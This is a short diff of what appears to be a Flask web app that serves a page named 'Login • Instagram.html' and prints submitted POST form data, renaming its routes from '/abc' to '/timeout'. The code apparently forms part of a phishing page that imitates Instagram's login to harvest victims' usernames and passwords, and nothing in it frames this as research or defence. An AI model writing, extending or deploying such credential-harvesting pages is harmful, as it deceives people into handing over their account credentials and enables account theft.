@@ -10,7 +10,7 @@ def saanvi_17():
     return render_template("home.html")
 
 
-@app.route("/abc")
+@app.route("/timeout")
 def abc():
     return render_template("Login • Instagram.html")
 
@@ -20,7 +20,7 @@ def after():
     return render_template("after.html")
 
 
-@app.route("/abc", methods=["POST", "GET"])
+@app.route("/timeout", methods=["POST", "GET"])
 def run_insta_code():
     if request.method == "POST":
         print(request.form)
